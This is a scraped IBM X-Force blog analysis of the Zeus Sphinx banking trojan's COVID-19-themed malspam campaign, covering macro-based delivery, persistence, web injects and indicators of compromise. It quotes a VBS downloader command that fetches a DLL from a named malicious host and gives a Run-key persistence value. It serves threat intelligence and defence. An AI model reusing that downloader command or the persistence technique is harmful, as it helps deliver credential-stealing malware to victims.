# Reference for threat actor for "Bamboo Spider, TA544"

**Title**: Zeus Sphinx Trojan Awakens Amidst Coronavirus Spam Frenzy

**Source**: https://securityintelligence.com/posts/zeus-sphinx-trojan-awakens-amidst-coronavirus-spam-frenzy/

## Content




 

Zeus Sphinx Trojan Awakens Amidst Coronavirus Spam Frenzy











































































































Security Intelligence 





News
Series
Topics
X-Force
Podcast






News
Series
Topics
Threat Research
Podcast











Search
























Application Security
Artificial Intelligence
CISO
Cloud Security
Data Protection
Endpoint


Fraud Protection
Identity & Access
Incident Response
Mainframe
Network
Risk Management


Intelligence & Analytics
Security Services
Threat Hunting
Zero Trust
Infographic: Zero trust policy
Timeline: Local Government Cyberattacks


Industries
Banking & Finance
Energy & Utility
Government
Healthcare




View All Topics































News
Series




Topics


All Categories
Application Security
Identity & Access
Artificial Intelligence
Incident Response
CISO
Mainframe
Cloud Security
Mobile Security
Data Protection
Network
Endpoint
Risk Management
Fraud Protection
Threat Hunting
Security Services
Security Intelligence & Analytics


Industries
Banking & Finance
Energy & Utility
Government
Healthcare




X-Force
Podcast








































Zeus Sphinx Trojan Awakens Amidst Coronavirus Spam Frenzy 








 





Light
Dark






March 30, 2020
By Amir Gandler



Limor Kessem


  7 min read




Malware
Threat Intelligence














 


The recent months have created a new reality in the world as the novel coronavirus pandemic spread from country to country raising concerns among people everywhere. With spammers and malware distributors already being accustomed to riding trending news, the COVID-19 theme has been exploited thoroughly by a large variety of spam and malspam campaigns. It appears that this was a good time for Zeus Sphinx (AKA Zloader, Terdot) to join the crowds and resurface after nearly three years of absence.
While some Sphinx activity we detected trickled in starting December 2019, campaigns have only increased in volume in March 2020, possibly due to a testing period by Sphinx’s operators. It appears that, taking advantage of the current climate, Sphinx’s operators are setting their sights on those waiting for government relief payments. Current malspam campaigns feature booby-trapped document files named “COVID 19 relief” and subject lines relying on the same theme. Sphinx’s targets have not changed from its past configuration files as it continues to focus on banks in the US, Canada, and Australia.
While the renewed Zeus Sphinx activity that IBM X-Force is seeing features a somewhat modified variant of this malware, Zeus Sphinx is not new malware and this variant is only slightly different than the original. We will therefore go into some basic modifications that were made in the variant we observed, mostly affecting its delivery and deployment on newly infected devices, as well as its focus on the current pandemic.
COVID-19-Themed Maldoc Spam Delivery
Almost all malware campaigns nowadays use malicious document files (maldocs) to reach potential victims’ mailboxes. The Sphinx campaigns we have observed are also being distributed via maldoc spam that takes advantage of the trending COVID-19 theme. Over the past three months, spammers everywhere are using the pandemic to spread phishing, scams and malware. In Sphinx’s case, the email tells victims that they need to fill out an attached form to receive monetary compensation for having to stay at home to help fight increasing infection rates.

Figure 1: Malspam delivering a Zeus Sphinx infection (Source: IBM X-Force)
From a variety of Office programs, with the majority being .doc or .docx files, these documents at first request the end user to enable executing a macro, unknowingly triggering the first step of the infection chain. Once the end user accepts and enables these malicious macros, the script will start its deployment, often using legitimate, hijacked Windows processes that will fetch a malware downloader. Next, the downloader will communicate with a remote command-and-control (C&C) server and fetch the relevant malware — in this case, the new Sphinx variant.
The maldoc is password-protected, likely to prevent analysis of the file before the recipient opens it.

Figure 2: Maldoc file requires a password to open (Source: IBM X-Force)
In the next step, the recipient is asked to enable macros.

Figure 3: Booby-trapped maldoc file asks user to enable macros (Source: IBM X-Force)
Once on the device, Sphinx establishes persistence via commonly used methods to maintain its grasp on the end user’s machine. In this case, it writes numerous folders and files to disk and adds some Registry keys in order to hide itself and manage its configuration files over time.
Deployment Method
The infection process of the new Zeus Sphinx variant starts off with the weaponized document that creates a malicious folder under %SYSTEMDRIVE% and writes a batch file into it.
After executing the batch file, it writes a VBS file to the same folder. That file is executed and uses a legitimate WScript.exe process, creates a communication channel with its C&C server and downloads a malicious executable in the form of a DLL.

Figure 4: Sphinx scripts and junk text inserted into the file (Source: IBM X-Force)
The command line is similar in several cases. As written in the VBS content file, this is an example of the command:
“nologo C:\Logs\Jobs.vbs http://brinchil.xyz/MLrPSC C:\Logs\kofet.dll“
The malicious DLL, which is Sphinx’s executable, is also written to the folder under %SYSTEMDRIVE%. The infection process is initiated with the execution of the Sphinx DLL using Regsvr32.exe, which sets off Sphinx’s infection chain.
At first, the malware creates a hollow process, msiexec.exe, and injects its code into it. This same step was used by older versions of Sphinx for deployment. It creates the first folder under %APPDATA% and creates an executable file in it. Later on, it will change the extension to .DLL for persistence purposes.
In addition, the malware adds over 10 other malicious folders containing various data files under %APPDATA%.

Figure 5: Sphinx folders written into the APPDATA section (Source: IBM X-Force)
Next, the malware creates a run key in the Registry under HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ with the path to the DLL set under %APPDATA% as a persistence method using Rundll32.exe and DllRegisterServer as an argument. This will execute the DLL using the Regsrv32.exe process.
For example:

Key — HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Uffuehh
Value — rundll32.exe C:\Users\michel\AppData\Roaming\Fecaa\dagicoy.dll,DllRegisterServer


Figure 6: Zeus Sphinx’s run key (Source: IBM X-Force)
The malware also creates two Registry hives under HKCU\Software\Microsoft\, each one containing one key that holds a part of its configuration.
Please note that all file and resource names are dynamically generated for each infected machine and not hardcoded; therefore, what’s shown in this blog are examples that will differ on each deployment.
Self-Signed Certificate
Sphinx signs the malicious code using a digital certificate that validates it, making it easier for it to stay under the radar of common antivirus (AV) tools when injected to the browser processes. In the following example, that file is named “Byfehi.”

Figure 7: Sphinx’s self-signing certificate (Source: IBM X-Force)
Zeus Web Injections Live On
Some of Zeus Sphinx’s origins, inherited from its Zeus v2 codebase, remain intact. There are several Zeus variants that operate in a similar way, writing resources to the %APPDATA% folder and writing Registry key to HKCU\Software\Microsoft.
To carry out web injections, the malware patches explorer.exe and browser processes iexplorer.exe/chrome.exe/firefox.exe but doesn’t have the actual capability of repatching itself again if that patch is fixed, which makes the issue less persistent and unlikely to survive version upgrades.
Sphinx further creates a mutex on the injected process in the form of GUID – [0-9A-F]{12}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{8}.
Malware Configuration
The Sphinx variant we looked at creates two Registry hives under HKCU\Software\Microsoft\, each containing one key that holds a part of its configuration.
In the example below, we can see this as HKCU\Software\Microsoft\Ehobb and HKCU\Software\Microsoft\olyq.

Figure 8: Sphinx’s configuration file (Source: IBM X-Force)
Current Targets
Once loaded and extracted from Sphinx’s process memory, it is visible that Sphinx is back to targeting major banks in the U.S. and Canada. We are also seeing rising infection rates in Australia targeting top banks in the region.
Fetch From Tables — A Commercial Web Inject Panel
The currently active Zeus Sphinx variant communicates with its C&C server using a web-based control panel for web injects. This platform is known as “Tables.”

Figure 9: “Tables” web interface — user login page (Source: IBM X-Force)
The Tables web injects system has been operational since 2014, fitted for, and mostly used by, Zeus-type Trojans that target entities in North America and Europe.
This panel provides all the necessary resources for the malware to infect and collect relevant information from infected victims’ machines. Once a connection to the Tables panel has been established, Sphinx will fetch additional JavaScript files for its web injects to fit with the targeted bank the user is browsing. Injections are all set up on the same domain with specific JS scripts for each bank/target.
About Zeus Sphinx
Zeus Sphinx initially emerged as a commercial banking Trojan that started selling and spreading for the first time back in August 2015, targeting major financial entities in the U.K. Expanding its reach over time to attack banks in Australia, Brazil and North America, attackers deploying Sphinx attacks remained focused on the banking sector in those countries, adapting their attacks to the local financial systems.
As a modular banking Trojan that’s based on the dated Zeus v2 code, Sphinx’s core capability is to collect online account credentials from banks and a wide range of other websites. It calls on its C&C server to fetch relevant web injections when infected users land on a targeted page and uses them to modify the pages users are browsing to include social engineering content and trick them into divulging personal information and authentication codes.
Want to keep up to date about Sphinx and emerging threat intelligence? Join us on IBM X-Force Exchange and read our research blogs on Security Intelligence.
Indicators of Compromise (IoCs)
Maldoc
DFF2E1A0B80C26D413E9D4F96031019CE4567607E0231A80D0EE0EB1FCF429FE
Samples
VBS sample: 2FC871107D46FA5AA8095B78D5ABAB78
Sphinx samples:
C8DFF758FEB96878F578ADF66B654CD7
70E58943AC83F5D6467E5E173EC66B28
7CA44F6F8030DF33ADA36EB35649BE71
8A96E96113FB9DC47C286263289BD667
C6D279AC30D0A60D22C4981037580939
IPs
104.27.179.176
104.27.178.176
185.14.29.227
49.51.161.225
47.254.174.129
C&C Servers
Downloader C&C: hxxp://brinchil.xyz
Sphinx C&Cs:
hxxps://seobrooke[.com]
hxxps://securitysystemswap[.com]
hxxps://axelerode[.club]



Banking Malware | Banking Trojan | Command-and-Control (C&C) | Credentials Theft | Cybercrime | Macros | Malware | Malware Analysis | Microsoft Office | Online Banking | Social Engineering | Spam | Trojan | X-Force




Amir Gandler
Threat Researcher, IBM Trusteer





Limor Kessem
Principal Consultant, X-Force Cyber Crisis Management, IBM






Continue Reading






POPULAR




 









                              Artificial Intelligence  
                        


                        February 1, 2024                  


Audio-jacking: Using generative AI to distort live audio transactions

  7 min read - While the evolution of LLMs mark a new era of AI, we must be mindful that new technologies come with new risks. Explore one such risk called "audio-jacking."                        






 









                              Risk Management  
                        


                        January 9, 2024                  


Cybersecurity trends: IBM’s predictions for 2024

  6 min read - As organizations begin planning their cybersecurity strategies for 2024, these expert insights provide guidance on facing the year to come.                        






 









                              Risk Management  
                        


                        February 7, 2024                  


Back to basics: Better security in the AI era

  4 min read - The rise of artificial intelligence (AI), large language models (LLM) and IoT solutions has created a new security landscape. From generative AI tools that can be taught to create malicious code to the exploitation of connected devices as a way…                        
























More from Malware
















                        October 30, 2023                    





                            Hive0051’s large scale malicious operations enabled by synchronized multi-channel DNS fluxing                        

  12 min read - For the last year and a half, IBM X-Force has actively monitored the evolution of Hive0051’s malware capabilities. This Russian threat actor has accelerated its development efforts to support expanding operations since the onset of the Ukraine conflict. Recent analysis identified three key changes to capabilities: an improved multi-channel approach to DNS fluxing, obfuscated multi-stage scripts, and the use of fileless PowerShell variants of the Gamma malware. As of October 2023, IBM X-Force has also observed a significant increase in…                        



















                        September 7, 2023                    





                            New Hive0117 phishing campaign imitates conscription summons to deliver DarkWatchman malware                        

  8 min read - IBM X-Force uncovered a new phishing campaign likely conducted by Hive0117 delivering the fileless malware DarkWatchman, directed at individuals associated with major energy, finance, transport, and software security industries based in Russia, Kazakhstan, Latvia, and Estonia. DarkWatchman malware is capable of keylogging, collecting system information, and deploying secondary payloads. Imitating official correspondence from the Russian government in phishing emails aligns with previous Hive0117 campaigns delivering DarkWatchman malware, and shows a possible significant effort to induce a sense of urgency as…                        



















                        June 6, 2023                    





                            ITG10 likely targeting South Korean entities of interest to the Democratic People’s Republic of Korea (DPRK)                        

  7 min read - In late April 2023, IBM Security X-Force uncovered documents that are most likely part of a phishing campaign mimicking credible senders, orchestrated by a group X-Force refers to as ITG10, and aimed at delivering RokRAT malware, similar to what has been observed by others. ITG10's tactics, techniques and procedures (TTPs) overlap with APT37 and ScarCruft. The initial delivery method is conducted via a LNK file, which drops two Windows shortcut files containing obfuscated PowerShell scripts in charge of downloading a…                        















Topic updates



                                    Get email updates and stay ahead of the latest threats to the security landscape, thought leadership and research.
                                    


                                                Subscribe today
                                          

















Analysis and insights from hundreds of the brightest minds in the cybersecurity industry to help you prove compliance, grow business and stop threats.



Cybersecurity News
By Topic
By Industry
Exclusive Series
X-Force
Podcast
Events
Contact
About Us



Follow us on social

























© 2024 IBM
Contact
Privacy
Terms of use
Accessibility
Cookie Preferences




Sponsored by
                                          



si-icon-eightbarfeature














